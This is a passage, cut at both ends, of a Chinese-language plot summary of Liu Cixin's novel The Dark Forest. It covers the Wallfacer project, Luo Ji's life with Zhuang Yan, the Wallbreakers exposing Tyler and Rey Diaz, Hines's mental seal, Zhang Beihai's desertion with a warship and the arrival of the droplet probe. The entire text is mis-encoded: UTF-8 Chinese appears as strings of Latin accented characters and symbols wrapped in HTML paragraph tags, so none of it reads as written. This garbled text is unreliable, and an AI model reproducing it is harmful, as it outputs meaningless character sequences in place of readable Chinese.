ä»–å…ˆè¦äº†ä¸ªä¾å±±å‚æ°´ï¼Œè¢«è‡ªç„¶æ‹¥æŠ±çš„å±±åº„ï¼Œå»é‚£å¼€å§‹äº«å—ç¤¾ä¼šæ–‡é›…çš„è´µæ—ç”Ÿæ´»ã€‚éšåï¼Œä»–åªè¦è¯´ä¸€å¥ï¼Œè¿™æ˜¯é¢å£è€…è®¡åˆ’çš„ä¸€éƒ¨åˆ†ï¼Œä»–æ‰€æœ‰èŠ±èŠ±å…¬å­çš„æ¬²æœ›éƒ½ä¼šè¢«æ»¡è¶³ã€‚è€Œäº‹å®ä¸Šï¼Œé‚£äº›ä¸–ç•Œé¢†å¯¼äººè§‰å¾—ï¼Œç½—è¾‘å¹²å¾—å¾ˆå¥½ï¼Œä¸ä»…è®©äººæ‰æ‘¸ä¸é€ï¼Œè¿˜æ¯”å…¶ä»–ä¸‰ä½èŠ±é’±å°‘ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººé€šè¿‡æ™ºå­ï¼Œä»æ®‹ä½™çš„åœ°çƒå›å†›ä¸­ï¼Œé€‰ä¸­äº†ä¸‰ä¸ªäººï¼Œå»ç ´è§£é¢å£äººçš„è®¡åˆ’ã€‚è¿™ä¸‰ä½è¢«ç§°ä¹‹ä¸ºï¼Œç ´å£äººã€‚ç½—è¾‘æ²¡æœ‰ç ´å£äººï¼Œå› ä¸ºä¸‰ä½“äººçŸ¥é“ï¼Œåªè¦ç½—è¾‘ä»–è‡ªå·±æƒ³ä¸æ˜ç™½ï¼Œä»–å°±æ˜¯è‡ªå·±çš„ç ´å£äººã€‚å…¶ä»–çš„ä¸‰ä½é¢å£äººï¼Œæœ‰äººåœ¨ç ”ç©¶æ ¸å¼¹ï¼Œæœ‰çš„åœ¨ç ”ç©¶å†›é˜Ÿï¼Œæœ‰çš„åœ¨ç ”ç©¶è„‘ç§‘å­¦ã€‚è€Œç½—è¾‘åœ¨å¹²å˜›å‘¢ï¼Ÿä»–åœ¨æ³¡å¦ã€‚</p><p>&emsp;&emsp;ä»–æŠŠå²å¼ºæ‰¾æ¥ï¼Œè®©å²å¼ºå»å®‰è£…è‡ªå·±çš„æè¿°ï¼Œæ‰¾åˆ°ä»–æ¢¦ä¸­çš„å¥³ç¥ï¼Œå²å¼ºå¾ˆå¿«æ‰¾åˆ°è¿™ä¸ªäººï¼Œå¥¹çš„åå­—å«ï¼Œåº„é¢œã€‚æ˜¯ä¸­å¤®ç¾é™¢å›½ç”»ç³»åˆšæ¯•ä¸šçš„å¤§å­¦ç”Ÿï¼Œå²å¼ºå¾ˆç®€å•çš„å°±æŠŠå¥¹å¿½æ‚ æ¥äº†ï¼Œå¥¹å¯¹åº„é¢œè¯´ï¼Œä¸–ç•Œéœ€è¦ä½ ï¼Œé¢å£è€…éœ€è¦ä½ ã€‚å½“ç½—è¾‘çœ‹è§è‡ªå·±æ¢¦ä¸­çš„å¥³ç¥ï¼Œæ´»ç”Ÿç”Ÿåœ°ç«™åœ¨é¢å‰æ—¶ï¼Œæ•´ä¸ªäººéƒ½å‚»äº†ï¼Œä»–å¯¹åº„é¢œè¯´ï¼Œä½ çš„å·¥ä½œæ˜¯ï¼Œä½¿è‡ªå·±å¿«ä¹ï¼Œæˆä¸ºä¸–ç•Œä¸Šæœ€å¹¸ç¦æœ€å¿«ä¹çš„å¥³å­©ã€‚è¿™æ˜¯é¢å£è®¡åˆ’çš„ä¸€éƒ¨åˆ†ã€‚</p><p>&emsp;&emsp;ä¸ä¹…åï¼Œç½—è¾‘å¸¦ç€åº„é¢œï¼Œå»äº†ä»–æœ€æƒ³å»çš„å¢æµ®å®«ã€‚åœ¨è’™å¨œä¸½èçš„å¾®ç¬‘é¢å‰ï¼Œä¸¤äººå å…¥çˆ±æ²³ï¼Œè¿™ä½çº¯æ´çš„å°å¥³ç”Ÿï¼Œæˆä¸ºäº†ç½—è¾‘çš„å¦»å­ï¼Œä»æ­¤å¼€å§‹äº†å¹¸ç¦çš„ç”Ÿæ´»ã€‚å²å¼ºåœ¨ä¹‹å‰æŠ“æ•åœ°çƒå›å†›çš„è¡ŒåŠ¨ä¸­ï¼Œæ”¶åˆ°äº†è¾å°„å½±å“èº«æ‚£ç™½è¡€ç—…ï¼Œç°ä»£çš„åŒ»ç–—æ‰‹æ®µæ— èƒ½ä¸ºåŠ›ï¼Œåœ¨å®Œæˆç½—è¾‘äº¤ä»£çš„è¿™ä¸ªä»»åŠ¡åï¼Œä»–è¿›å…¥äº†å†¬çœ ã€‚å¸Œæœ›æœªæ¥çš„åŒ»ç–—æ°´å¹³èƒ½æ•‘ä»–ä¸€å‘½ã€‚</p><p>&emsp;&emsp;äº”å¹´åï¼Œç¬¬ä¸€ä¸ªè¢«ç ´å£çš„é¢å£äººæ˜¯å‰ç¾å›½å›½é˜²éƒ¨é•¿ï¼Œæ³°å‹’ã€‚ç ´å£äººä»¥ç²‰ä¸çš„èº«ä»½èµ°å…¥ä»–çš„å®¶ä¸­ï¼Œæ­ç©¿äº†ä»–çš„ç›®çš„ã€‚è¯´é“ï¼Œä½ è¡¨é¢ä¸Šæ˜¯æƒ³å»ºç«‹ä¸€æ”¯å¤ªç©ºç¥é£æ•¢æ­»é˜Ÿï¼Œè·Ÿä¸‰ä½“äººæ­»ç£•ã€‚å…¶å®ï¼Œä½ çš„è¿™æ‰¹éƒ¨é˜Ÿï¼Œä¼šè£…å¤‡ä¸€ç§å«çƒçŠ¶é—ªç”µçš„æ­¦å™¨ï¼Œè¢«å®ƒæ‰“æ­»çš„äººä¼šå˜æˆå¹½çµæ€ï¼Œåœ¨å¼€å±•å‰å¤•ï¼Œä½ ä¼šè®©ä»–ä»¬å»å·è¢­åœ°çƒå†›é˜Ÿï¼ŒæŠŠè‡ªå·±äººæ‰“æˆé‡å­æ€çš„å¹½çµéƒ¨é˜Ÿï¼Œè®©ä»–ä»¬å»æ­»ç£•ä¸‰ä½“äººï¼Œåœ¨ç ´å£äººæ­ç©¿æ³°å‹’çš„è®¡è°‹åï¼Œæ¥äº†ä¸€å¥ç¥è¡¥åˆ€ã€‚å³ä¾¿æ‚¨æˆåŠŸäº†ï¼Œä¸»ä¹Ÿä¸åœ¨ä¹ã€‚</p><p>&emsp;&emsp;ç ´å£äººå°†è‡ªå·±çš„æˆæœå‘åˆ°ç½‘ä¸Šï¼Œéšåèˆ†è®ºå“—ç„¶ï¼Œå¤§å®¶æ¥å—ä¸äº†æ³°å‹’æ€æ­»è‡ªå·±çš„äººçš„è®¡åˆ’ï¼Œå¤±è½çš„æ³°å‹’ï¼Œåœ¨ç½—è¾‘åˆ«å¢…çš„å‘¨å›´ï¼Œé¥®å¼¹è‡ªå°½ã€‚</p><p>&emsp;&emsp;ä»æ­¤äººä»¬å¯¹é¢å£è€…äº§ç”Ÿäº†è¶Šæ¥è¶Šå¤šçš„è´¨ç–‘ï¼Œç½—è¾‘çš„å¥½æ—¥å­ä¹Ÿåˆ°å¤´äº†ã€‚ä¸–ç•Œæ”¿åºœç§˜å¯†åœ°å°†ä»–çš„å¦»å­å’Œå­©å­å†¬çœ é€åˆ°æœªæ¥ï¼Œå¼ºè¿«ç½—è¾‘åšç‚¹ä»€ä¹ˆï¼Œæ¯•ç«Ÿä»–æ˜¯ä¸‰ä½“äººå”¯ä¸€è¦æš—æ€çš„äººç±»ã€‚è‹¦æ€å†¥æƒ³çš„ç½—è¾‘ï¼Œèµ°åœ¨å·²ç»è¢«å†»ç»“çš„æ¹–é¢ä¸Šã€‚å“—å•¦ä¸€å£°ï¼Œå†°é¢è£‚å¼€ï¼Œç½—è¾‘æ‰å…¥äº†æ¹–é‡Œï¼Œåœ¨æ¼†é»‘å†°å†·çš„æ¹–æ°´é‡Œï¼Œä»–ç»ˆäºæ˜ç™½å½“åˆå¶æ–‡æ´å¯¹ä»–è¯´çš„é‚£ç•ªè¯æ˜¯ä»€ä¹ˆæ„æ€äº†ã€‚å¥½åœ¨ç½—è¾‘èº«ä½“ç´ è´¨è¿˜è¡Œï¼Œä¸ç„¶å·®ç‚¹å°±æ·¹æ­»äº†ã€‚ </p><p>&emsp;&emsp;æ‚Ÿå‡ºçœŸæƒ³çš„ç½—è¾‘ï¼Œèµ¶ç´§åŠ¨ç”¨ç‰¹æƒï¼ŒæŠŠä»–æŠ¤é€åˆ°ä¸€ä¸ªåŠå…¶å®‰å…¨çš„åœ°ä¸‹å®¤ï¼Œåœ¨è¿™é‡Œï¼Œç½—è¾‘é€šè¿‡è‡ªå·±çš„æƒåˆ©ï¼Œå‘å®‡å®™å‘å°„äº†ä¸€ä¸ªæ’æ˜Ÿçš„åæ ‡ï¼Œè¿™ä»¶äº‹è¢«åäººæˆç§°ä¸ºï¼Œé€»è¾‘çš„å’’è¯­ã€‚ç”±äºå’’è¯­å¾ˆä¹…åæ‰èƒ½ç”Ÿæ•ˆï¼Œæ‰€ä»¥ç½—è¾‘å‘Šè¯‰åŒ»åŠ¡äººå‘˜ï¼ŒæŠŠä»–é€å»å†¬çœ ï¼Œç­‰é‚£é¢—æ’æ˜Ÿçˆ†ç‚¸åï¼Œå†å”¤é†’ä»–ã€‚ä½†å¾ˆå¿«ï¼Œä»–å°±åœ¨ä¸€æ¬¡é­åˆ°äº†æš—æ€ï¼Œè¿™ä¸€æ¬¡ä½¿ç”¨çš„æ˜¯åŸºå› æ­¦å™¨ï¼Œé’ˆå¯¹ç›®æ ‡è¿›è¡Œç—…æ¯’æ„ŸæŸ“ï¼Œç°åœ¨çš„åŒ»ç–—æ‰‹æ®µå¯¹å®ƒæ¯«æ— æŠµæŠ—èƒ½åŠ›ï¼Œç½—è¾‘ç«‹åˆ»è¢«åŒ»ç–—äººå‘˜å¼ºè¡Œå†¬çœ ï¼Œå¸Œæœ›åœ¨æœªæ¥ï¼Œèƒ½æœ‰åŒ»ç–—æ‰‹æ®µæ²»ç–—ä»–ã€‚</p><p>&emsp;&emsp;å…«å¹´åï¼Œé¢å£è€…é›·è¿ªäºšå…¹å’Œå¸Œæ©æ–¯ä»å†¬çœ ä¸­è¢«å”¤é†’ï¼Œä»–ä»¬è¢«å‘ŠçŸ¥ï¼ŒæŠ€æœ¯å·²ç»æˆç†Ÿåˆ°ä»–ä»¬çš„é¢„æœŸäº†ï¼Œè„‘ç§‘å­¦å®¶å¸Œæ©æ–¯å¾—åˆ°è¶…çº§è®¡ç®—æœºã€‚ä¸ä¹…ä¹‹åï¼Œä»–å’Œå¦»å­é€ å‡ºäº†æ€æƒ³é’¢å°ï¼Œæ€æƒ³é’¢å°å¯ä»¥åœ¨äººè„‘ä¸­è¾“å…¥ä»»ä½•ä¿¡æ¯ï¼Œå¹¶è®©è¿™ä¸ªäººåšä¿¡ä¸ç–‘ã€‚æ¯”å¦‚ï¼Œåœ¨å—å°è€…è„‘ä¸­è¾“å…¥æ°´æ˜¯æœ‰æ¯’çš„ï¼Œæ¸æ¸åœ°ä»–å°±å†ä¹Ÿä¸æ•¢å–æ°´äº†ï¼Œè¿™å°æœºå™¨çš„ä¸»è¦ç”¨é€”åœ¨äºç»™äººç±»å¤ªç©ºå†›çš„æ€ç»´æ‰“ä¸Šäººç±»å¿…èƒœçš„ä¿¡å¿µã€‚</p><p>&emsp;&emsp;æ ¸å¼¹ç‹‚äººé›·è¿ªäºšå…¹å¾—åˆ°äº†3.5äº¿å¨çš„æ’è¡Œå‹æ°¢å¼¹ï¼Œç´§éšå…¶åçš„æ˜¯ï¼Œä»–çš„ç ´å£äººå‡ºç°ï¼Œç ´å£äººè¯´é“ï¼Œä½ æƒ³é€ ä¸€ç™¾ä¸‡å¯æ’æ˜Ÿæ°¢å¼¹æ”¾åœ¨æ°´æ˜Ÿä¸Šï¼Œä¸»è¦çš„ç›®çš„ä¸æ˜¯é˜²å¾¡åœ°çƒï¼Œè€Œæ˜¯ä¸ºäº†å¼•çˆ†æ°´æ˜Ÿã€‚æŠŠæ°´æ˜Ÿæ¨è¿›å¤ªé˜³é‡Œï¼Œä»è€Œè®©åœ°çƒï¼Œç«æ˜Ÿï¼Œé‡‘æ˜Ÿè„±ç¦»è½¨é“å å…¥å¤ªé˜³ï¼Œä¸æŠµè¾¾çš„ä¸‰ä½“äººåŒå½’äºå°½ï¼Œæ¯ç­ä¸‰ä½“äººæƒ³å¾—åˆ°çš„ä¸œè¥¿ã€‚è¿™ä½ç ´å£äººåœ¨æœ€ååŒæ ·æ¥äº†ä¸€å¥ç¥è¡¥åˆ€ï¼Œä½ çš„è®¡åˆ’ï¼Œä¸»ä¸åœ¨ä¹ã€‚å› ä¸ºä»¥åœ°çƒçš„èµ„æºï¼Œæ ¹æœ¬é€ ä¸å‡ºä¸€ç™¾ä¸‡é¢—æ’æ˜Ÿæ°¢å¼¹ï¼Œå³ä¾¿é€ å‡ºæ¥äº†ï¼Œä»¥è¿œè¿œä¸å¤ŸæŠŠæ°´æ˜Ÿç‚¸åˆ°è„±ç¦»è½¨é“ã€‚</p><p>&emsp;&emsp;ç ´å£äººå…ˆå‰ä¹ŸæŠŠèµ„æ–™ä¸Šä¼ åˆ°ç½‘ä¸Šï¼Œèˆ†è®ºå†æ¬¡å“—ç„¶ï¼Œå¤§å®¶æ¥å—ä¸äº†è¿™ç§ç–¯ç‹‚çš„ä¸¾åŠ¨ã€‚åœ¨ä¹‹åçš„å¬è¯ä¼šä¸Šï¼Œé›·è¿ªäºšå…¹çš„é¢å£è€…èº«ä»½è¢«ç»ˆæ­¢ï¼Œåœ¨å‡†å¤‡æŠ“æ•é›·è¿ªäºšå…¹æ—¶ï¼Œä»–æ’’è°è¯´è‡ªå·±çš„æ‰‹ç¯ä¸Šæ˜¯æ‘‡ç¯®ç³»ç»Ÿï¼Œ åªè¦è‡ªå·±æœ‰ç”Ÿå‘½å±é™©ï¼Œæ‰‹ç¯ä¸Šçš„ä¿¡å·å°±ä¼šä¸­æ–­ï¼Œä»è€Œå¼•çˆ†çº½çº¦å¸‚çš„æ°¢å¼¹ï¼Œå¦‚æœçº½çº¦å¸‚çš„æ°¢å¼¹è¢«è§¦ç¢°ä¹Ÿä¼šçˆ†ç‚¸ï¼Œé›·è¿ªäºšå…¹æˆåŠŸé€ƒè„±ï¼Œåœ¨å›å›½çš„è·¯ä¸Šï¼Œå¤§å®¶æ‰çŸ¥é“è¿™ä¸ªæ‘‡ç¯®ç³»ç»Ÿä¸è¿‡æ˜¯ä»–ä¸ºäº†è„±èº«çš„å¹Œå­ã€‚</p><p>&emsp;&emsp;å›å›½åï¼Œè¿™ä½ä»¥å¾€è¢«å›½æ°‘è®¤ä¸ºæ˜¯å¤§è‹±é›„çš„å‰æ€»ç»Ÿ å¹¶æ²¡æœ‰è¿æ¥é²œèŠ±å’ŒæŒå£°ï¼Œè€Œæ˜¯æ— æ•°çš„çŸ³å¤´ï¼Œé›·è¿ªäºšå…¹å½“åœºè¢«æ— æ•°çš„çŸ³å¤´ï¼Œç ¸æ­»ã€‚</p><p>&emsp;&emsp;ä¸€ç™¾å…«åäº”å¹´åï¼Œç½—è¾‘ä»å†¬çœ ä¸­è¢«å«é†’ï¼Œä»–å‘ç°å‘¨å›´çš„äººå……æ»¡è‡ªä¿¡ï¼Œåœ¨è¿™ä¸ªæ—¶ä»£ï¼Œäººä»¬çš„åŸºå› æ¸æ¸è¿›åŒ–ï¼Œåˆ°å¤„éƒ½æ˜¯å¸…å“¥ç¾å¥³ï¼Œäººç±»æŒæ¡äº†ä¸¤ä¸ªæŠ€æœ¯ï¼Œå¯æ§æ ¸èšå˜ï¼Œè¿™é¡¹æŠ€æœ¯çš„å‡ºç°ï¼Œå½»åº•è§£å†³äº†äººç±»çš„èƒ½æºé—®é¢˜ï¼ŒçŸ³æ²¹èƒ½æºè¢«æ·˜æ±°äº†ã€‚åœ¨è¿™ä¸ªæ—¶ä»£å·²ç»æ²¡æœ‰çœç”µçœæ°´çš„æ¦‚å¿µäº†ï¼Œæ‰€æœ‰çš„ç”µå™¨éƒ½ä¸å†ä½¿ç”¨ç”µæ± ã€‚å¦ä¸€é¡¹æ˜¯ï¼ŒåŸºå› æ”¹é€ æŠ€æœ¯ï¼Œå½»åº•è§£å†³äº†ç²®é£Ÿé—®é¢˜ã€‚</p><p>&emsp;&emsp;ç°åœ¨äººä»¬é€ å‡ºäº†ä¸¤åƒè‰˜å¤ªç©ºæˆ˜èˆ°ï¼Œé£èˆ¹èƒ½è¾¾åˆ°å…‰é€Ÿçš„ç™¾åˆ†ä¹‹åäº”ï¼Œæ¯”ä¸‰ä½“äººçš„é£èˆ¹å¿«å¤šäº†ã€‚é¢å£è®¡åˆ’å¾ˆæ—©å°±è¢«åºŸæ­¢äº†ï¼Œç½—è¾‘å½“å¹´å‘å¤ªç©ºå‘é€çš„å’’è¯­ï¼Œè¢«å½“æˆäº†ç¬‘è¯ã€‚ä¸ºäº†å‡†å¤‡ä¸ä¸‰ä½“äººä½œæˆ˜ï¼Œäººä»¬åœ¨ä¸€åƒç±³ä»¥ä¸‹å»ºç«‹äº†åŸå¸‚ï¼Œå¤§å¤šæ•°äººç”Ÿæ´»åœ¨åœ°ä¸‹ï¼Œå°‘éƒ¨åˆ†äººç”Ÿæ´»åœ¨åœ°é¢ä¸Šï¼Œä¸»æµè¯­è¨€å˜æˆäº†è‹±è¯­ä¸€æ±‰è¯­çš„æ‚ç³…è¯­è¨€ï¼Œå¸Œæœ›ä¸‰ä½“äººå é¢†åœ°çƒçš„å›å†›ç»„ç»‡ï¼Œæ—©åœ¨ä¸€ä¸ªä¸–çºªå‰å°±è¢«æ¶ˆç­äº†ã€‚ä¹‹å‰äººç±»ç»å†çš„å¤§ä½è°·ï¼Œé‚£æ—¶å€™ä¸–ç•Œæ ¼å±€ç´§å¼ å¼‚å¸¸ï¼Œäººäººéƒ½å¤„åœ¨å¤‡æˆ˜çŠ¶æ€ï¼Œä½è½çš„æƒ…ç»ªä¸‹ï¼Œäººä»¬è‡ªæš´è‡ªå¼ƒï¼Œç»æµå¼€å§‹å¤§æ»‘å¡ï¼Œç¯å¢ƒå¼€å§‹æ¶åŒ–ï¼Œå…¨ä¸–ç•Œéƒ½å‘ç”Ÿäº†é¥¥è’ã€‚äººåƒäººæˆäº†å¸¸æ€ï¼Œäººå£æ€¥å‰§ä¸‹é™ï¼Œåæ¥è¶Šæ¥è¶Šå¤šäººé€æ¸æƒ³æ˜ç™½ï¼Œæ—¢ç„¶ç¾éš¾ä¸€å®šè¦æ¥ä¸´ï¼Œç—›è‹¦çš„ä¸€å¤©ä¹Ÿæ˜¯ä¸€å¤©ï¼Œå¼€å¿ƒçš„ä¸€å¤©ä¹Ÿæ˜¯ä¸€å¤©ï¼Œäºæ˜¯ä»–ä»¬ç«™å‡ºæ¥å¼•å¯¼å¤§å®¶ï¼ŒæŒ¯è‡‚é«˜å‘¼ï¼Œç»™å²æœˆä»¥æ–‡æ˜ï¼Œè€Œä¸æ˜¯ç»™æ–‡æ˜ä»¥å²æœˆã€‚</p><p>&emsp;&emsp;éšå³äººç±»çš„å¤å…´è¿åŠ¨å…´èµ·ï¼Œæ–‡æ˜åŠ é€Ÿè¿›æ­¥ï¼Œç½—è¾‘ä»å†¬çœ ä¸­æ¢å¤äº†ä¸å°‘åï¼Œå‚åŠ äº†æœ€åä¸€æ¬¡é¢å£è€…è¿œç¨‹å¬è¯ä¼šã€‚åœ¨ä¼šä¸Šï¼Œä»–çœ‹åˆ°äº†å·²ç»è‹é†’çš„å¸Œæ©æ–¯å’Œä»–çš„å¦»å­åŠ©æ‰‹ï¼Œå¬è¯ä¼šåƒä»–ä»¬å®£å¸ƒäº†ï¼Œé¢å£è€…è®¡åˆ’è¢«ç»ˆæ­¢ï¼Œæ‰€æœ‰é¢å£è€…æ¢å¤æ™®é€šäººçš„èº«ä»½ï¼Œå¸Œæ©æ–¯çš„äº²å­åœ¨å¤§ä¼šä¸Šï¼Œå¯¹ä¸ˆå¤«è¯´é“ï¼Œæˆ‘æ˜¯ä½ çš„ç ´å£äººã€‚ä½ æ‰€åˆ¶é€ çš„æ€æƒ³é’¢å°ï¼Œç»™æ¯ä¸ªäººæ‰“ä¸Šçš„æ€æƒ³å‰é¢éƒ½åŠ äº†è´Ÿå·ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™äº›äººï¼Œåšä¿¡çš„æ˜¯äººç±»å¿…è´¥ï¼Œä½ æ˜¯æƒ³åŸ¹å…»å‡ºä¸€æ‰¹é€ƒäº¡ä¸»ä¹‰è€…ï¼Œé€ƒå‡ºåœ°çƒã€‚</p><p>&emsp;&emsp;ä¼šä¸Šçš„äººæ— ä¸æƒŠè®¶ï¼Œå¤ªç©ºå†›å¼€å§‹è°ƒæŸ¥è¿™æ‰¹è¢«æ‰“ä¸Šäººç±»å¿…è´¥ä¿¡ä»°çš„é’¢å°æ—ï¼Œæ•£ä¼šåä¸ä¹…ï¼Œè¿™ä½é¢å£è€…çš„å¦»å­ï¼Œå°±åˆ‡è…¹è‡ªå°½äº†ã€‚è€Œé¢å£è€…å¸Œæ©æ–¯å¹¶æ²¡æœ‰å¾—åˆ°åˆ¶è£ã€‚ä¼šåï¼Œç½—è¾‘ç¢°ä¸Šäº†è€æœ‹å‹å²å¼ºï¼Œæ²¡å¤šä¹…ï¼Œç½—è¾‘å°±å†æ¬¡é­åˆ°äº†æš—æ€ï¼Œç¬¬ä¸€æ¬¡å·®ç‚¹è¢«æ— äººæ±½è½¦æ’æ­»ï¼Œç¬¬äºŒæ¬¡å·®ç‚¹å è½èº«äº¡ï¼Œç¬¬ä¸‰æ¬¡å·®ç‚¹è¢«æœºå™¨äººæœåŠ¡å‘˜æ…æ­»ï¼Œç¬¬å››æ¬¡å·®ç‚¹è¢«æ¯’æ­»ï¼Œç¬¬äº”æ¬¡å·®ç‚¹è¢«åªèƒ½æ²™å‘å‹’æ­»ï¼Œè¿™æ¬¡æš—æ€ä»–çš„ï¼Œæ˜¯å«åškillerçš„æš—æ€ç—…æ¯’ï¼Œå¥½åœ¨ä¸€å‘è­¦è§‰æ•é”çš„å²å¼ºåœ¨ä»–èº«è¾¹æ•‘äº†ä»–ã€‚éšåï¼Œä»–ä»¬ä¸ºäº†èº²é¿ç”µè„‘è¿½æ€ï¼Œç¦»å¼€äº†åœ°ä¸‹åŸå¸‚ï¼Œå»äº†åœ°è¡¨ã€‚</p><p>&emsp;&emsp;å¦ä¸€è¾¹çš„å¢æ´æœªæ¥çš„æŒ‡æŒ¥å®˜ä»¬è¢«å”¤é†’ï¼Œç”±äºé’¢å°æ—éšè—å¾—å¾ˆæ·±ï¼Œæ‰€ä»¥è¿™æ‰¹è¢«å”¤é†’çš„å†›å®˜ï¼Œè¢«ä»»å‘½ä¸ºæ‰§è¡Œèˆ°é•¿ï¼Œå…¶ä¸­å°±åŒ…æ‹¬ç« åŒ—æµ·ã€‚ç« åŒ—æµ·ç™»ä¸Šäº†è‡ªç„¶é€‰æ‹©å·ï¼Œèˆ°é•¿æ˜¯ä¸€ä½æ¼‚äº®çš„å¥³ç”Ÿï¼Œåå«ä¸œæ–¹å»¶ç»­ï¼Œä»–ç»™äº†ç« åŒ—æµ·ä¸€æŠŠæ‰‹æªï¼Œè¯´ï¼Œå¦‚æœå‘ç°æˆ‘æœ‰å¤±è´¥æ³¨æ„çš„æƒ³æ³•ï¼Œå¯ç”¨å®ƒæ€äº†æˆ‘ã€‚ç»“æœæŒ‡æŒ¥æƒçš„ç« åŒ—æµ·ç«‹åˆ»åšå‡ºäº†è®©æ‰€æœ‰äººéƒ½æ„æ–™ä¸åˆ°çš„ä¸¾åŠ¨ï¼Œå®ƒé€šè¿‡å„ç§æŒ‡ä»¤ï¼ŒåŠ«æŒè‡ªç„¶é€‰æ‹©å·ä¸Šçš„2000åèˆ¹å‘˜ï¼Œè·‘è·¯äº†ã€‚</p><p>&emsp;&emsp;å…¶å®ä»–ä¸€ç›´éƒ½æ˜¯ä¸€åä¼ªè£…å¾ˆå¥½çš„å¤±è´¥ä¸»ä¹‰è€…ï¼Œä»–åšä¿¡äººç±»å¿…è´¥ï¼Œèˆ°é˜Ÿå¸ä»¤éƒ¨çš„å¸ä»¤ä»¬éƒ½æ‡µäº†ï¼Œè¿™æ˜¯ä»€ä¹ˆçŠ¶å†µï¼Ÿå¸ä»¤å®˜ä»¬åæ˜ äº†åŠå¤©æ‰å›è¿‡ç¥æ¥æ´¾å‡ºè¿½å‡»èˆ°é˜Ÿã€‚å¦ä¸€è¾¹ï¼Œä¸–ç•Œæ”¿åºœå¼€å§‹å•†è®¨å¦‚ä½•å®‰ç½®å³å°†è¢«äººç±»æ‰“è´¥çš„ä¸‰ä½“äººã€‚ä¸æ­¤åŒæ—¶ï¼Œäººç±»è§‚æµ‹åˆ°ï¼Œä¸‰ä½“èˆ°é˜Ÿæ´¾å‡ºäº†ä¸€ä¸ªå°å‹æ¢æµ‹å™¨ï¼Œå·²ç»è¿›å…¥äº†å¤ªé˜³ç³»ã€‚å›½é™…èˆ°é˜Ÿå†³å®šï¼Œæ´¾å‡ºå…¨éƒ¨ä¸¤åƒé›¶åäº”è‰˜æ’æ˜Ÿçº§æˆ˜èˆ°ï¼Œæ‹¦æˆªä¸‰ä½“æ¢æµ‹å™¨ï¼Œä»¥æ˜¾ç¤ºåœ°çƒçš„é›„å¨ã€‚</p><p>&emsp;&emsp;æ­¤æ—¶åœ°çƒä¸Šæ‰€æœ‰çš„åª’ä½“éƒ½åœ¨ç›´æ’­è¿™ä¸€ç››å†µï¼Œå‡ ä¹æ‰€æœ‰äººéƒ½æ¿€åŠ¨åœ°å®ˆåœ¨å±ç›®å‰ï¼Œæœ‰çš„å‘å‡ºå…´å¥‹çš„å°–å«ï¼Œæœ‰çš„æ„ŸåŠ¨å¾—åšå••å¤§å“­ï¼Œæ— äººä¸ä¸ºè‡ªå·±æ–‡æ˜è€Œè‡ªè±ªï¼Œå„åœ°å¼€å§‹äº†æ¥è¿ä¸æ–­çš„ç‹‚æ¬¢ï¼Œèˆ°é˜Ÿç´§å¯†çš„æ’æˆäº†100X20çš„é•¿æ–¹å½¢çŸ©é˜µï¼Œä¸€èµ·å»è¿æ¥ã€‚83å²çš„ä¸ä»ªå·²ç»æ˜¯è¿™ä¸ªæ—¶ä»£æœ€å¾·é«˜æœ›é‡çš„ç§‘å­¦å®¶äº†ï¼Œä»–è¢«é€‰ä¸­ä½œä¸ºç¬¬ä¸€ä¸ªæ¥è§¦ä¸‰ä½“å°å‹æ¢æµ‹å™¨çš„äººã€‚å…ˆå¤´é£èˆ¹æ•è·äº†è¿™æšæ¢æµ‹å™¨ï¼Œè¿™æšæ¢æµ‹å™¨å¤–è¡¨åƒæäº†ä¸€æ»´æ°´ï¼Œå®ƒçš„è¡¨æ˜å…‰æ»‘æ— æ¯”ï¼Œå¦‚åŒæ˜é•œã€‚äºæ˜¯äººä»¬ç»™äº†å¥¹ä¸€ä¸ªç§°å‘¼ï¼Œæ°´æ»´ã€‚</p><p>&emsp;&emsp;è°¨æ…çš„ä¸ä»ªåœ¨æ¥è§¦æ°´æ»´å‰ï¼Œä»¤ä»–æ‰€åœ¨çš„é‡å­å·é£èˆ¹ï¼Œéšæ—¶å‡†å¤‡ä»¥æœ€é«˜é€Ÿåº¦è·‘è·¯ï¼ŒåŒæ—¶ä¸´è¿‘çš„é’é“œæ—¶ä»£å·å·²ç»å…¥äº†å‡†å¤‡çŠ¶æ€ã€‚æ°´æ»´è¢«æˆåŠŸæ•è·ï¼Œè¿™ä¸€ç”»é¢ä¼ åˆ°äº†åœ°çƒã€‚å‡ ä¹æ‰€æœ‰çš„äººéƒ½åœ¨æ¬¢å‘¼é›€è·ƒï¼Œçƒ­æ³ªç›ˆçœ¶ã€‚ä¸ä»ªåšå£«ä¸Šåƒä»”ç»†è§‚çœ‹ï¼Œä»–å‘ç°æ°´æ»´çš„è¡¨é¢åŠå…¶å…‰æ»‘ï¼Œå½“ä»–ç”¨æ˜¾å¾®é•œçœ‹æ°´æ»´è¡¨é¢æ—¶ï¼Œä»–å“åäº†ã€‚æ— è®ºæ˜¯æ”¾å¤§ä¸€ç™¾å€ï¼Œè¿˜æ˜¯ä¸€åƒå€ï¼Œä¸€ä¸‡å€ï¼Œä¸€ç™¾ä¸‡å€ï¼Œä¸€åƒä¸‡å€ã€‚æ°´æ»´çš„è¡¨é¢è¿˜æ˜¯å…‰æ»‘æ— æ¯”ï¼Œåƒé•œé¢ä¸€æ ·ã€‚è¿™æ„å‘³ç€ï¼Œæ”¹ç‰©ä½“å¯†åº¦æå…¶çš„å¤§ï¼Œæ— æ¯”çš„åšç¡¬ï¼Œå®ƒå¯ä»¥è½»æ˜“çš„æ¨ªç©¿åœ°çƒï¼Œä¸”ä¸ä¼šæœ‰ä¸æ¯«æŸä¼¤ï¼Œå°±åƒå­å¼¹ç©¿è¿‡å¥¶é…ªã€‚äººä»¬ç°åœ¨æ‰€èƒ½é€ å‡ºæœ€å…‰æ»‘çš„ä¸œè¥¿ï¼Œæ”¾å¤§ä¸ªå‡ ç™¾å€ï¼Œå°±å¯ä»¥çœ‹åˆ°ç²—ç³™çš„åƒé‡é‡å±±å³°çš„çº¹ç†ã€‚æƒŠè®¶æ— æ¯”çš„ä¸ä»ªåšå£«ç¼“ç¼“å›è¿‡ç¥æ¥ï¼Œè‡ªè¨€è‡ªè¯­é“ï¼Œæ¯ç­ä½ ï¼Œä¸ä½ 